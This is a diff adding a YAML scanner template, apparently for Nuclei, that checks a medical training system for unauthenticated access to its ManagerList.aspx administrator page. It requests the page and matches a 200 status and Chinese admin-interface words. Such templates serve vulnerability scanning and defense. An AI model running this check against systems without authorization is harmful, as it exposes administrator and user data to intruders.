@@ -1,0 +1,22 @@
+id: poc-yaml-yq-mts-managerlist-unauthorized-access
+info:
+  name: 远秋医学培训系统 ManagerList 未授权访问漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: unauthorized-access
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/User/ManagerList.aspx?ty=1&ty=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "管理员设置"
+          - "添加人员"
+          - "登录号码"
+          - "登录类型"
